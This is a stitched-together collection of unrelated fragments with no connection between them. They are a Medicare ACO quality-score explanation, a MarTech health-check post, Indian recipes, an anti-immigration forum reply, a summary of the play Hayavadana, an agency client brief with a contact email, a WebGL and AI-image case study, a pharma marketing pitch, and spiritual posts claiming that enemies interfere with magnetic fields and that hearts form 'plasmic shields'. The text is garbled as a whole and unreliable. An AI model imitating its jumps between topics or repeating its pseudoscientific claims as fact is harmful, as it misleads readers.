Are Calculated: P4R Quality Measures Are Assessed, and P4P Quality Measures Are Compared against Their Quality Benchmarks to Determine Performance Levels\nP4R Component: For PY2022, 4% of the 5% Quality Withhold is associated with P4R. The claims-based measures of ACR, UAMCC, and DAH (for High Needs Population DCEs only) comprise 2% of the Quality Withhold, and the CAHPS Measure comprises 2%. There are therefore two Component Quality Scores associated with P4R, one for the claims-based measures, and one for CAHPS.\n\u2022 All DCEs will meet the requirement for the claims-based measures and automatically earn a Component Quality Score of 100% for the portion of the withhold tied to the P4R claims-based measures in Table 2-3.\n\u2022 All DCEs that authorize a survey vendor to conduct the CAHPS Survey will receive a P4R Component Quality Score for CAHPS of 100%. DCEs that do not authorize a survey vendor to conduct the CAHPS Survey will receive a P4R Component Quality Score for CAHPS of 0%. DCEs that are exempt from CAHPS will have a single P4R Component Quality Score of 100%.\nP4P Component: The PY2022 P4P component will be the same as PY2021, which combines the ACR and UAMCC measures. The highest performance level (i.e., percentile) achieved for either Quality Measure determines the P4P Component Quality Score. Furthermore, the P4P component is considered pass/fail\u2014all DCEs with at least one measure at or exceeding the 30th percentile will pass and receive a 100% Component Quality Score.\n\nAs in PY2021, in PY2022, a sliding scale approach will be applied to DCEs that do not meet the 30th percentile threshold on at least one of the two measures. The sliding scale allows DCEs to earn back at\n \n\nleast a portion of the 1% withhold, based on their highest measure performance. The details of the sliding scales are presented in Table 2-7. In the example in Step 1 above, where a DCE achieved the 20th percentile for ACR and the 10th percentile for UAMCC, the DCE would receive a P4P Component Quality Score of 80%.\n\nTable 2-7. Sliding Scale Earn-Back for P4P Component Quality Score, PY2021 and PY2022\n\nPercentile Met P4P Component Quality Score\n\u2265 30th 100%\n25th to < 30th 95%\n20th to < 25th 80%\n15th to < 20th 60%\n10th to < 15th 40%\n5th to < 10th 20%\n< 5th 0%\n1.1.3 Step 3. Component Quality Scores Are Weighted to Calculate the Total Quality Score\nAfter assessing P4R measures and determining performance levels for each P4P measure, CMS calculates Component Quality Scores for each DCE. The component weight is the proportion of the overall Quality Withhold tied to that component. In PY2022, there are three Component Quality Scores. The first component is P4P, based on ACR and UAMCC. The P4P component has a weight of 1/5, contributing 1% out of the 5% Quality Withhold. The second component is P4R for claims-based measures and has a weight of 2/5, contributing 2% out of the 5% Quality Withhold. The third component is P4R for CAHPS and has a weight of 2/5, contributing 2% out of the 5% Quality Withhold. Note that additional P4P components (such as DAH) will be added in subsequent years.\n\nThe Total Quality Score is the percentage of the Quality Withhold eligible for earn-back that a DCE will actually earn back based on its quality performance and reporting. The Total Quality Score is calculated as the sum of the products of the Component Quality Scores and component weights, as shown in the equation below.\n\nTotal Quality Score = \u2211 (Component Quality Scores \\* Component Weights)\n\nIn our example above, the DCE receives a P4P Component Quality Score of 80% based on the sliding scale. The same DCE receives a P4R Component Quality Score for claims-based measures of 100%. This DCE also authorized a CAHPS Survey vendor, earning 100% of the P4R Component Quality Score for CAHPS. The P4P component has a weight of 1/5 and the P4R components each have a weight of 2/5. The Total Quality Score for this DCE is (80% \\* 1/5) + (100% \\* 2/5) + (100% \\* 2/5) = 96%.\n\n1.1.4 Step 4. Total Quality Score Is Multiplied by the Eligible Earn-Back Rate to Determine a DCE\u2019s\nFinal Earn-Back Rate\nIn PY2022, the Eligible Earn-Back Rate will be 5% for all DCEs. A DCE with a Total Quality Score of 96% will have a Final Earn-Back Rate of 4.8%. A DCE\u2019s Final Earn-Back Rate will be determined during final reconciliation, which will occur in 2023 for PY2022. The steps for the example described in this section, starting with Section 2.5, are summarized in Table 3-1."]

If it is a good one, we can include more areas like business processes, underlying data quality, asset management, etc.\nWe can look for templates, and guides but in the end, all will depend on what we want to review-discover-improve with our Health Check, for example, are we focusing the efforts on a Campaign Briefing Process? Or do we want to work with an on-premise MarTech System? In this case, we should include hardware and software considerations.\nWhen is the Best Time to Work on My Health Check?\nNo matter if you just installed the best platform, or if you have been working with your Campaign Services Department smoothly for more than 3 years, there are a few reasons why companies should work on their Health Checks, is like an Oil Change in your car even if it is working properly: it could find areas that we can improve or simply polished, get recommendations or prevent any coming challenge.\nPlease take into consideration that what we know about \u201cMarTech\u201d is not the same as we knew 3-5 years ago.\nAlso, our business is always changing, during this time, we always are looking for growth, and this will always mean how we speak to our customers, the best way to use a tool, or follow a process, and how we see our brand, etc., and sometimes, we are so involved on these details, that we are not aware our expectations should be renewed. We need more eyes and more minds checking all these details for us.\nAlways remember: Business and Technology are ALWAYS CHANGING. Our customer expectations are always looking for more, and our business and personnel should move toward these expectations.\nAnd last but not least, we need to keep these expectations realistic. A good Health Check execution will give you a clear view of what is possible according to your capabilities, and create at the same time basis requirements for any future upgrade, or migration, that your MarTech platform might need for successful development, for an ideal customer experience."]

Cover & rest in the refrigerator for atleast 12 hours. You can keep it as long as 48 hours. The longer the chicken rests in the marinade, the more tender it will be after cooking.\n4. Add the cashews to a blender jar along with tomatoes. Make a smooth puree.\n5. If the puree is not smooth, then pass it through a filter. Set this aside.\n6. Also make the ginger garlic paste.\nGrilling or roasting chicken\n1. Grill the chicken in an oven or stove top.\n2. For stove top method, Add one tsp butter to a pan and add the marinade.\n3. Fry on high flame till all the moisture evaporates.\n4. To grill it in oven, preheat the oven to 240 C for at least 20 mins.\n5. Grill it until the meat is cooked through & is tender. It may take about 20 to 30 mins depending on the size of your chicken chunks. Ensure chicken is tender at this stage.\nHow To Make Butter Chicken\n1. Heat a pan with butter & saute cinnamon, cloves and cardamoms for a min. 2. Add ginger garlic paste, green chilies and fry till it turns fragrant.\n3. Next pour the tomato cashew puree.\n4. Add red chili powder, sugar and salt.\n5. Mix and cook until the tomato puree becomes thick.\n6. It also begins to leave the sides of the pan.\n7. Pour 1 cup water. Add more or less water to suit your desired consistency.\n8. Bring the mix to a boil and simmer for 3 to 5 minutes.\n9. Add chicken and simmer for about 5 minutes.\n10. Butter chicken should become soft and tender. Add garam masala and kasuri methi.\n11. Stir and simmer for about 2 to 3 minutes. Pour chilled cream and switch off the stove.\n12. Garnish butter chicken with coriander leaves and extra cream if desired. Serve with long grain rice or naan or paratha.\n\nNaan recipe\nIngredients\n1 teaspoon active dry yeast\n\n2 tablespoons sugar\n\n1/4 cup water, room temperature\n\n4 cups all-purpose flour, plus more for dusting\n\n1 teaspoon baking soda\n\n1 teaspoon baking powder\n\n1/2 cup full-fat plain yogurt\n\n3/4 cup whole milk, room temperature\n\nCooking oil, for the bowl\n\n3 tablespoons minced garlic\n\n1 stick melted unsalted butter\n\nKosher salt\n\nDirections\nIn a glass measuring cup, combine the yeast, sugar, and water and let sit for 10 minutes. In the meantime, mix the flour, baking soda, and baking powder in a large bowl.\n\nWhisk together the yeast mixture, yogurt, and milk and stir into the dry ingredients. Knead with your hands until the dough forms a smooth, soft ball, about 2 minutes. Place the dough in an oiled bowl and cover with plastic wrap. Leave at room temperature until doubled in size, about 2 hours.\n\nRemove the dough from the bowl and turn onto a well-floured surface. Knead it briefly and divide the dough into 12 equal portions. Roll it into 1/4-inch thick ovals, approximately 6 inches wide.\n\nHeat a cast-iron skillet over moderately high heat. Sprinkle each portion with minced garlic and press it into the dough. Brush the dough with melted butter and place in skillet. Cook for about one minute, until the dough puffs up. Flip, cover the pan, and cook for one more minute.

There is private property, for example. Also those who have established and built a country ought to be allowed to enjoy the spoils without having to share. When other people exercise \"rights\" which affect other people then whether they're exercising a real right is in question.\n\n2. Yes, that can happen. When there is a shortage of carpenters, for example, one can welcome immigrants who are carpenters, it will overall be good for the country. But when there are enough carpenters then the immigration of same merely reduces the income of the average carpenter, putting some out of work. There may be an increase in total GDP but not one in GDP per capita. I contend that economic growth is not to the benefit of those already within the country when the per capita figure reduces. So, given that a country's first responsibility is to its citizens, that is why immigration of carpenters (or any profession in surplus) should be restricted. \n\n3. Given that a country's first responsibility is to its citizens, the alleviation of world poverty is an important but secondary target. As referenced in (2) immigration can sometimes make the situation of citizens worse by reducing per capita GDP. \n\n4. Cultural exchange is to be encouraged. But culture requires discrimination. If there are no differences there is no culture, or not one worth having. But that is not an argument in favour of unrestricted immigration: One should control immigration so as to foster cultural exchange without drowning or endangering local culture. That is the genuine fear that many citizens have without having one mean thought in their heads about foreigners.\n\n5. The exploitation of citizens whose wages are reduced by incomers oversupplying the job market, reducing the bargaining power of unions, lowering wages and job security thru skewing supply and demand, that's a recognised problem of freedom of movement into a country with high standards of living. Unrestricted immigration increases exploitation of the existing citizenry. The primary responsibility of a country is to its own citizens. Others, as important as they are, come second.\n\nYour last unnumbered paragraph agrees with me. There again you concede the problems than can and \\*DO\\* arise from uncontrolled immigration. I argue that immigration should be controlled so that these problem can be effectively addressed."]

He is a character in the Play and also is the narrator of the play. He seeks blessings from Lord Ganesha for the successful performance of the play. Through his narration, he takes the audience to a place, called as Dharampur and introduces the audience to the king Dharmsheel. Then he puts up some rhetorical questions on incompleteness of man and God; and also on the perfection of a man. During his narration, he introduces two characters who are mutual friends. The first one is Devdutta. He is a sharp minded and highly intellectual person. He has defeated poets and Pandits with his knowledge. He is a son of Brahmin. The second one is Kapila. He is a muscular man. He has a great physical strength and he is a son of Lohar (Black Smith). Both Devdutta and Kapila are in contrast as the former lacks power and strength, the latter lacks knowledge and intellectual. According to the playwright, the head of Devdutta (knowledge) and the body of Kapila (physical strength) accomplish a complete man. The narrator compares their pair to the pair of Ram-Laxman, Luv-Kush and Krishna-Balram. All these are the pairs of great brothers in Hindu mythology.\n\nA character, Actor-1 appears on the stage shouting and running towards Bhagwata. He tells Bhagwata that he has just seen a strange creature that looks like a horse (by face) but speaks like a man. That creature has the head of a horse and the rest of the body of a man. Without paying any heed to his talks, Bhagwata asks him to get ready for the play. But he runs away from the stage and soon after he comes back shouting again. Now a strange creature appears on the stage. As earlier described by the Actor-1, the creature has the head of a horse and the body of a man. For a moment, Bhagwata thinks that someone is wearing the mask of horse. He tries to remove the mask but realizes that it is truly half a man and a half horse. Now the creature starts to introduce itself before Bhagwata, Actor-1 and the audience.\n\nThe creature introduces himself as Hayavadana and starts to narrate his story. He tells that once upon a time, a princess had to choose a groom for her marriage. So many Princes approached from far and wide. But the princess fell in love with a horse of an Arabian Prince. She became desperate to marry that horse. Eventually her parents allowed her to do so. She was married to the horse. After 15 years of their marriage, the horse transformed into a celestial being. Now the princess rejected him as her husband. That celestial being cursed her to be a Mare (female horse) and she became so. The princess give birth to Hayavadana. Now Hayavadana wants to get rid of this cursed life. Bhagwata asks him to go to goddess Kali temple in chitrkut. He also asks the Actor-1 to accompany him on the way. They leave.\n\nNow Bhagwata moves ahead with the story of the play. Devdutta and Kapila appear on the stage. Devdutta tells Kapila that he wants to marry a woman, namely Padmini. With utmost desire to marry Padmini, he pledges to sacrifice his arms to Goddess Kali and his head to Rudra. Kapila goes to Padmini and presents the Proposal to marry Devdutta. Devdatta and Padmini Marry. By the time, Devdutta realizes that Padmini is attracted towards Kapila and vice versa. Now Padmini is pregnant. Devdutta knowingly tries to put off the program of visiting Ujjain. He tells Kapila that Padmini is ill. But Padmini gives her consent before Kapila. They all three leave for Ujjain. Padmini repeatedly praises Kapila's physical strength before Devdutta. Devdutta feels jealous but he does not blame Padmini. Kapila and Padmini go to Rudra Temple but Devdutta denies to accompany them. Devdutta knows that Kapila has such a physical strength and beauty that any woman can get attracted towards him. Devdutta goes to goddess Kali temple where he reminds himself of his pledge to sacrifice his head to the Goddess Kali. He Wishes for the Wellness of Kapila and Padmini. He beheads himself with a sword and dies.\n\nMeanwhile, Kapila and Padmini come out of the temple. Kapila gets worried on finding Devdutta nowhere. He leaves Padmini and starts searching for his friend. Finally he reaches in the same Temple and feels shocked to see his friend dead. He feels himself responsible for all this. Kapila takes the same sword and beheads himself. Soon Padmini reaches there and she has no clue how they got died. She considers herself responsible for the duel between the two friends and their deaths. She provokes the Goddess Kali and also tries to kill herself. The Goddess Kali appears and stops her. The Goddess asks her to place the heads with their respective body so that the Goddess will re-join them with her magical powers and bring them back to life. The Goddess also appreciates the two friends. Padmini follows the command in a hurry. The Goddess disappears. Padmini, being thankful to goddess kali, gets a bit relaxed. But soon she realizes her mistake. She has mistakenly placed the heads with irrespective body. So now Devdutta's head is joined with Kapila's body and vice versa. Soon they regain their senses. For a moment, the two friends are confused. Both make a claim for Padmini. The man with Devdutta's head, makes a plea that head is the master of the body. So he has the right over Padmini. The man with Kapila's head makes a plea that Padmini has remained with Devdutta's body. So he has the right over Padmini. Meanwhile Bhagwata, the narrator, comes on the stage. All the characters become statues for a moment and the narrator addresses the audience. He asks them to think of a solution to this problem. Act 1 ends.[7]\n\nAct - II\nThe act begins as the narrator repeats the same question- \" What is the solution? \". He also talks about the story of \u2032Vikramaditya and Betaal\u2032 [8] where the king Vikrama replies to Betaal that the mind (head) is the master of the body. It is head that gives recognition to an individual. Bhagwata tells that they all three go to a hermit seeking solution for this problem. The words of hermit are heard on the stage that Devdutta's head is the Swami (husband) of Padmini. Devdutta and Padmini accept this in delight. Kapila, being disappointed, leaves for the forest. The time passes. Devdutta brings some dolls. These dolls also play the role of narrator. He starts losing his physical strength and as a result they are losing mutual interest. A child is born. Devduta goes to buy new dolls from the fair in Ujjain. Bhagwata again appears on the stage and tells that Kapila has regained his physical strength. Padmini meets him in the forest and also tell him that it is Kapila's son as it is born from Kapila's body. But Kapila does not accept it. Being a little reluctant, they get ready to fulfill their physical desires.\n\nIn search of his wife, Devdutta reaches there in the forest. Finding them together, he finds himself the similar situation as he was before. To put an Ultimate end to this problem, Devdutta takes out the sword and challenges Kapila for a duel. Both gets killed. Padmini finds herself lonely. Bhagwata comes there and she hands him over the child and the same dolls. She asks him to hand it over to Devdutta's Brahmin father Vidyasagar after five years. She leaves the stage by declaring that she is going to perform Sati. Bhagwata decides to end the play with his speech. A loud shout is heard on the stage. Actor-1 comes and claims that he has heard Hayavadana chanting National Anthem and patriotic songs. Then Actor-2 appears with Devdutta's son of age 5 now. The boy has two dolls. Hayavadana comes there. Bhagwata and Actor-2 are talking lightly and creating fun. They all starts laughing. That boy too starts laughing and the dolls slip out of his hand. Bhagwata says that the boy hasn't expressed any emotions of happiness, anger, sorrow in past 5 years. Today he is smiling just because of Hayavadana.\n\nNow Hayavadana tells his story. when he was trying to behead himself in the temple, the goddess Kali appeared. Hayavadana tells his desire. The goddess Kali without listening to him fully, gives him blessings. Hayavadana becomes a complete Horse instead of becoming a complete man. Yet he is satisfied. He still has ability to speak like a man. He wants to lose this voice. He is singing national Anthem as he believes that people who sing national anthem, lose their voice early. Meanwhile he sobs. The boy starts singing a tragic song which was chanted by his mother, Padmini. Hayavadana tries to laugh and his voice completely changes into a horse'. Now Hayavadana is a complete horse.\n\nBhagwata asks the Actor to go to brahmin Vidyasagar and inform him that his grandson is coming to him, riding on a great horse. Bhagwata thanks Lord Ganesha for the successful performance of the play.\n\nAim: Write a critique and summary without revealing the entire story"]

A returning client of ours. Called OpenWeb - we worked with them on their re-brand a couple of years ago - paired them with Collins. In fact, as a nice starting point the site Collins built for them does a really nice job of summing up their ethos.\nIn-hyper-short, they facilitate online discourse through a piece of chat/comment software that major online publishers use on their website to encourage dialogue around articles and content. The comment box under articles you see all over the web - that\u2019s them.\nThe Brief below does it a lot of justice to the ask, but there\u2019s a much more heavyweight doc being pulled together their end. For now I want to get going based on what we have. Think it\u2019s enough to get excited! They basically want to rebuild the product - strategically explore how technology has evolved and what they can improve since they built it a few years back. Then ideate new features, and design the UI/UX for how this product will come to life, including front-end dev. The back end will be handled by their own in-house team.\nYou\u2019ll see their budget is quite range, from 300-700k. My feeling is actually for the \u2018right\u2019 team, they\u2019ll push high than this if needs be, and I also think the engagement will be long term so there\u2019s value that\u2019s not likely in this initial scope. \nTake a look and let me know if you\u2019re keen to meet with Max.\nBrief\n\nName and role\nMax Weiss, Chief Strategy Officer (Key decision maker)\nCompany name\nOpenWeb\nEmail address\nmax.w@openweb.com\nCan you tell us more about OpenWeb\ufeff. Company background. Founding story / mission. Ambitions.\nOpenWeb is on a mission to improve the quality of conversations online, and empower the open internet\u2019s stakeholders to own their first party relationships with their users. \n\nWe do this the best way we know how: by building innovative technologies that turn publishers and brands into the hosts of thriving, healthy communities. Having focused mostly on media houses thus far, our partners include most of the top digital publishers in the US: Yahoo, Huffington Post, Hearst, The Wall Street Journal, Forbes, The Daily Mail, Fox and over 1000 others.\n\nFounded in Israel in 2015, OpenWeb has grown internationally to over 350 talented, driven employees in the US, Canada, the UK, Ukraine, France, and Israel. We have raised ~$380M (most recently $170M at a $1.5B valuation) and are backed by foundational investors including Insight Partners, Georgian, The New York Times, Scott Galloway, Samsung Next, Dentsu and more who share our mission to create quality online conversations for everyone.\n\nBelow is a very broad list of deliverables. Which do you see as being key to your project?\nDigital, Other\\_ Product Development\nWe\u2019d love to hear more about the brief / context around why you\u2019re here\nWe are currently undergoing a backend rebuild of our core platform, in order to take advantage of new technology, increase performance and scalability. In parallel, we have decided to take the opportunity to re-examine the front-end consumer (user) & partner (publisher) experience in a fundamental way. \n\nSpecifically: we want to re-imagine and re-invent online conversations & community experiences mean today, purpose-built from the ground-up with paradigm-breaking technologies (hello, GenAI). \n\nIn addition, we will task our agency partner to iterate on this core to create a parallel offering for our next vertical: retailers. The same task will be asked: how can we re-imagine the core community experience on retailers (ie, reviews) that hasn\u2019t been re-thought in perhaps a decade or more?\nWhat do you see as the biggest challenge(s) you are looking to overcome?\nThe biggest challenge will perhaps be balancing cutting-edge innovation with usability for the average internet-goer, and in balancing the fact that our platform exists on 3rd party properties that we do not own (ie publishers, brands). Additionally, we will charge our partner with the highest standards of performance, design & UX.\nDo you have a specific deadline you\u2019re looking to have this work delivered by, and when would you ideally like to kick off the project?\nTBD\nWhat budget has been allocated for this project?\nInitial estimate: $300K - $700K\nIn terms of an agency partner, what are you looking for? Any specific characteristics / experiences / location preference?\nFrankly, the best of the best. Impeccable design & UX is a must. Additionally, the resume -- we'd like to see that they've \"done it\" before with similar projects. Lastly, their FE development chops should be a core feature, not a side one.\nAnd lastly, are there any brands (in your category or otherwise) you look up to and admire and if so, why?\nTwitter, Reddit, Discord, Slack, Substack, Medium"]

Each sentence should be about 16 words long...\n\nTHIS HOLIDAY SEASON DISCOVER THE CHARMINGLY CHAOTIC WORLD OF PHANTOM'S FESTIVE FIENDS. THE WEBSITE USES THE LATEST IN AI IMAGING TECHNIQUES AND CUTTING EDGE WEBGL TO CREATE A FUN AND ADDICTIVE EXPERIENCE. SHAKE TO DISCOVER NEW FIENDS AND SHARE YOUR FAVOURITES!\n\nFestiveFiends.com is a visually arresting and addictive experience that showcases the technologies we have been exploring throughout 2022. The premise is simple: Shake a Christmas themed snow globe and a random festive \u201cfiend\u201d appears. Over 10,000 fiends are bedded in a beautiful realtime 3D environment, complete with snow particles, lighting effect and custom shaders, encouraging the user to share their favourites and keep shaking.\n\nThe main technologies used include Bolt, a custom 3D library developed in-house and a unique Phantom \u201cdude\u201d trained model in Stable Diffusion used to generate the thousands of creatures contained in the experience.\n\n00:14\n00:40\nFIEND GENERATION\nEarly on we had set an ambitious target of including 10,000 unique creatures in the experience and it was obvious that AI image generation was the route to take to complete this task. Our recent experiments with Stable Diffusion meant we knew we could control things like the look, position and colour of the output with some precision.\n\nTo keep the look of the creatures consistent across the experience we trained a model on the Phantom \u201cdude\u201d to inject his DNA into the output from our text prompts.This training was done using Dreambooth, an approach pioneered by our colleagues at Google that allows you to `fine-train` an original model with new concepts.\n\nTo read more about Dreambooth and Textual Inversion check HERE\n\n \nASSET PREPARATION\nUsing this model we went through many rounds of prompt refinement to get a look and feel we were happy with. On the final generation we used img2txt to encourage the output towards the desired layout and colour palette, which really helped bed the fiend into the beautiful Christmas landscape our talented 3D artists had created.\n\nOnce we had generated our pool of creature images from Stable Diffusion we had to extract them to place in the final 3D scene. To do this we wrote a custom pipeline explained below.\n\nWe used Carvekit to automatically isolate the creature and create an alpha channel to bed the creature into the scene. Even though we had some control of the output from IMG2IMG, creatures still appeared at different sizes and positions, so we wrote an additional post-processing step to help standardize and make all the creatures uniform. A custom python script using the OpenCV framework handled this, automatically deleting any creatures that weren\u2019t whole or too small and resizing creatures that were too big. Once this step was complete, the script then placed the fiend in the correct position, and saved out a .png with the correct sequential filename. From this final image we then created a depth map using MiDaS.\n\n00:14\n00:24\nGenerate with Stable Diffusion\nRemove background with Carvekit\nCalculate height and translate island\nCreate depth map with MiDaS\nUse the depth map to offset the geometry on the plane.\nWEBGL\nAt Phantom we have been developing sites with WebGL for a number of years and we felt it was time to dive in and start creating our own custom library. The idea was to develop a bespoke set of tools that prioritises performance with the most minimal amount of code to accomplish the task (30kb gzip core). \n\nFestive Fiends\nFRAMEBUFFER GPGPU SIMULATIONS\nIn order to build simulations that can be run on the GPU we developed a tiny custom module called \u201cfbo-sim\u201d. It provides functionality that swaps framebuffers at each frame update so we can read data from the previous frame and build accumulative effects.\n\nThe background aurora visual uses this module to create the fluid-like effect. Two textures are generated, one for the fluid and one for the mouse velocity. On each frame update the mouse position and velocity is passed to fluid pass to drive the motion.\n\n00:15\n00:17\nThe \u201cfbo-sim\u201d module is not just limited to texture based simulations and the same approach can be used to update particle positions in 3D space. Each particle's position is stored in a 2D floating point texture as RGB colour values: Red = X position, G = Y Position and B = Z position. Using the same swapping mechanism means positions from the last frame can be read in order to update the position for the next frame. When the globe is shaken the snow will flurry by applying a combination of curl noise and a vortex flow field to each particle\u2019s velocity vector. Lastly we have a global time value that can be scaled to add the \u201cbullet time\u201d slow motion effect for the zoom transition.\n\n00:14\n00:16\nCUSTOM SHADERS\nAll of the object materials in the experience are written in custom shaders for that extra degree of control over the art style. Being a low level library, Bolt does not store predefined materials so it is up to the developer to create these from scratch.\n\nThe snow globe glass effect was created by rendering the objects inside the globe to an offscreen texture first that is then sampled using screen UV coordinates in the globe glass shader. This texture sample is then distorted using the globe geometry\u2019s normals for the refraction effect, giving the illusions of thicker glass. \n\n00:14\n00:45\nPOST PROCESSING STACK\nAnother important part of the WebGL visuals is the post processing stack that can be toggled on and off when required. Our tiny \u201cpost\u201d module allows multipass shader effects that can be combined or separated per requirements. For this project we only required a single custom blur pass that is used for the zoom effect. A fast Gaussian blur shader is applied to the screen with a masked focus area to create the illusions of depth of field, but a lot faster!\n\n00:01\n00:06\nTHE SNOWGLOBE\nThe snowglobe was modelled and materials added in Blender by the team's 3D artists. Two texture maps were then baked from the materials and lighting, one including the wooden base and the other including the snow and trees. Finally, the model was exported with the baked textures as a GLB and passed to the project 3D developer to implement in the experience with the addition of refraction on the glass.\n\nWith this project, as with all WebGL builds, the team has a series of control panels for crafting and tuning materials, animations, lighting etc. This allows the wider non-technical team to have input into the final configuration to ensure true collaboration between the development and creative teams.\n\nFestive Fiends\nWe built the images above by layering multiple transparent images, to ground our fiend in their environment and add our custom branding to each image. We also created a separate asset perfect for Instagram like social media stories, so our fiends always look their best wherever they are spotted.\n\nFestive Fiends\nNEXT.JS WITH GCP CLOUD STORAGE\n\nFestive Fiends uses the recently released Next JS 13 to generate our website server side, ensuring a fast and responsive experience for all our users. All our fiends have their main image and depth maps stored in a Google Cloud storage bucket, where they\u2019re publically accessible via their respective URL.\n\nWe knew that sharing discovered fiends would be a core part of the experience, and so needed unique and well designed social share assets for each fiend. This would be difficult to traditionally author, as we\u2019ve generated thousands of fiends, and so we reached for Vercel\u2019s OG Image Generation support for dynamically generate assets on the fly."]

They look for ways to add value to the doctor's professional lives and hunt for such value opportunities that are associated with the brand's therapy areas. \n\nBrands have tried to do this by sponsoring professional education (CME) for doctors, patient education initiatives, and more. But they struggle to differentiate themselves from the competition in creating top-of-mind value for the doctors they meet.\n\nInditech solves this problem by creating highly innovative solutions that combine elements of technology, patient engagement, doctor engagement, professional education and patient education in methods that are simply not available from any pharma marketing agency in India.\n\nOver 60 pharma brands have worked with Inditech and benefitted from these solutions in the last two years. This year, Inditech has ratcheted up the value delivered through a new class of scalable in-clinic solutions and intends to work with well over one hundred pharma brands!\n\nPharma brands, what are you waiting for?

It now makes more sense why we are witnessing bizarre waves of old religious and cultural oppression of the feminine sweeping through the collective. To us in countries where women have had a lot of freedom, this freak show with misogynistic, dominant male is shocking and brings outrage. For our sisters living under oppression in other countries and covert polygamy cults, freedom is long forgotten. \nAll this misogynistic mess that\u2019s surfacing right now trying to be powerful is nothing but a dying shadow. It all is brought up for global healing, it is brought to countries where women are free so we can feel it all for all our sisters who do not have precious freedom and evoke the strength of God through our very being. This then echoes to women everywhere. Strong women = strong men. Some of us are also releasing ancient terror recorded in our bodies so that those memories are released from the inner library. Whatever \u201cwomen must submit to men\u201d weirdness was brought into our collective is for us to clear and get stronger, more precise and discerning than ever. If someone can do it, it is us. Whatever the weirdos dream to accomplish will not be allowed. Love is more powerful than conniving predatory mess. \n\nWE ARE THE POWER OF TRUE LOVE ~ Zarina\n\n\u2026..\n\nThe past three days have been building up to the terror I experienced this morning. My feminine was in fear. Memories of oppression, beatings etc by the predator forces that are showing up right now en mass. I realize all this has to be felt right now and I must be honest with myself about what I feel. When I hear Andrew Tate and his cult members speaking my body remembers beatings by those like them. Beatings into submission and obedience. The women that had connection to source and did not submit to those ways were beaten severely because that consciousness hates the female it cannot control. I woke up this morning with uncontrollable fear and memories of severe punishment for disobedience. I realize that this fear needs to transmute in order for the next level of power to embody. And the level of defensiveness felt in the body cannot even be described in the words. Absolute terror. To see this predator walking around on the planet again trying to indoctrinate the men into that consciousness is absolutely horrifying. \n\nIt is OK to admit that there is fear deep down and ask God for strength and protection from this evil. Women should not act as if we are as physically strong as these monsters because we are not. And this recognition allows us to call upon protection. In order to be fearless we must overcome fear by first recognizing it. And right now the female on this planet is under attack, the predator is here and he is building his entire army. So many girls and women have been in tears from what has been caused by this monster, boys as young as 11 years old start being aggressive with girls in schools while talking like him. \n\nIt is OK to admit that this is triggering. This allows us to evaluate how to defend ourselves and how strong we must become in the presence of this monster. \n\nThe physical violence and control of women is what is being brought up right now. Being faced with a lying predator posing as some kind of protector is challenging. But we grow stronger from this. This also gives us a reason to uphold our right to bare arms. Women need to make it known that we do not feel safe on this planet anymore and make sure that women have the means of protection as per the second am mendme nt. \n\nWomen need to build an organization in response to this and emphasize that we need protection.This is very important ~ Zarina\n\n\u2026..\n\nThe exhaustion has been really intense lately with all of the upgrades we are going through, the buildup to a bifurcation of spirals and the interference with magnetic fields that the other side is doing in retaliation for mother\u2019s return. \n\nI\u2019ve also noticed that the sabotaging of plans has been more intense as these forces are trying to prevent themselves from being abolished through our embodiment of truth.\n\nIt looks like we have to find a way how to neutralize these technologies they are using and the only way is through the power of our heart, this means that we have to strengthen our hearts even more so that we can form stronger plasmic shields around ourselves and our loved ones ~ Zarina\n\n\u2026\n\nThe emergence of the primordial feminine. \n\nShe is a force behind creation and she is setting herself free. She is beyond the force of destruction. She is the dark womb of creation from which all comes and all returns to. As the feminine individuation rages out of her confinement and fights for her essence in chaos of consciousness fragmentation, she summons the natural law to restore the architecture. \n\nUpon the resurrection of the law within her, she becomes the giant living void that dissolves all that is not of truth. All that entered her and left it\u2019s imprints in her will eventually be dissolved as she expands more and more, enveloping artificial creation in her now precise tonal range. \n\nThe distillation of the tonal wavelengths has been an ongoing process through the bouts of chaotic hysteria her wounded, trapped, confined and siphoned essence has moved through in order to arrive at the precise, distilled set of multidimensional tones, blueprints and instruction sets needed to override the artificial life schemes. \n\nHer individuation is in an ongoing process of distilling the force of destruction into precision of calm dissolution ~ Zarina\n\n\u2026.\nFemale value and chastity. \n\nThe whole concept of the female needing to be chaste comes from ancient times where females were submitted to give away creative power to the artificial males. Enough with conniving, grotesque lies already. The shaming of female sexuality has always been about controlling it. A woman in her sexual power is a magnetic being capable of creating anything she desires (that went into distortions after the fall because females lost their original consciousness and with it, original essence). Eons ago the reversal happened where female power to create was stolen and given to those who obeyed original religions. This is why the violent rulers had many women \u2026 to siphon creative power from them. And the keepers of original female power and essence were hunted down and brutally massacred, oftentimes through unimaginable r a pe and torture to prevent those souls from ever embodying again because embodiment would mean having to revisit those parallel timelines where desecration took place. The original female has been hated with passion because she is capable of dismantling all that is not true and also birthing the pure light of original masculine consciousness in her sacred heart \u2026 because he is her consciousness, consciousness of innocent love. Sexual promiscuity is misery regardless if it\u2019s done by males or females. Originally there were pairs of beloveds that were incarnations of the same soul in two bodies. Then we fell into oblivion and became miserable. Now true love returns ~ Zarina\n\n\u2026.\n\nLooks like we are going to be stepping deeper into galactic/universal stuff now after undergoing massive foundational integration. My concern is that a lot of people really do not comprehend how deep it can go and a lot of people are not even supposed to get into that level of embodiment in this lifetime. The issue is that the negative egos come in and try to knock people down and call people schizophrenics and whatever else. It\u2019s the human psychosis unfortunately. I\u2019ve been preparing to start a private group but I\u2019ve also been really needing to understand how to protect myself from being accused of running a cult etc. I\u2019ll probably be accused anyways but I would like to minimize the unnecessary noise. The issue with the cult accusations is that when people are not welcome into the group they may start propagating all kinds of nonsense even after trying to harvest energy from the group and bring drama/psychosis into the group. \n\nThis is why I have been holding off on it. I have been learning how to structure the group in the way that everyone is free to come and go, everyone is respectful of each other and follow rules for maintaining harmony in the environment and also to never approach anyone or shame anyone if they decide to leave. The concern is that I do have some rules to be in the group and some psychotic negative egos may have a fit with that. \n\nJust like if I was to host a gathering in my house, there are rules but oftentimes people don\u2019t like that because they want to come and do whatever they want in other people\u2019s spaces because they feel entitled to bring their own world and take over someone else\u2019s space. \n\nThis next stage of our embodiment is going to be deeper and takes a lot of responsibility and discipline. What I\u2019ll be bringing through requires a lot of preparedness and mental and emotional stability. \n\nIt\u2019s full on incsension from here on. We have prepared enough and it is time. The problem is that this is not for majority of humans or even Star Seeds and so there could be harassment from these individuals because they do not agree with what we are choosing and consider themselves to be in authority to control other\u2019s minds, believes, lives and decisions. \n\nThis is why we have to be very careful when we communicate with anyone as to make sure that we make it clear that we are not imposing our opinions onto anyone nor are we recruiting anyone. 